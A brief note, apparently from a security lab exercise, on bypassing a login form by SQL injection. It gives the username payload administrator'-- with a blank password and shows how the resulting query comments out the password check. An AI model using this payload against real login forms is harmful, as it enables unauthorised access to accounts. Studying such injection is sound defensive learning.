## SQL injection vulnerability allowing login bypass

==> submitting the username administrator'-- and a blank password '' 

query==> 
 SELECT * FROM users WHERE username = 'administrator'--' AND password = ''

 in login form 
 uesername = administrator' --
 password = ''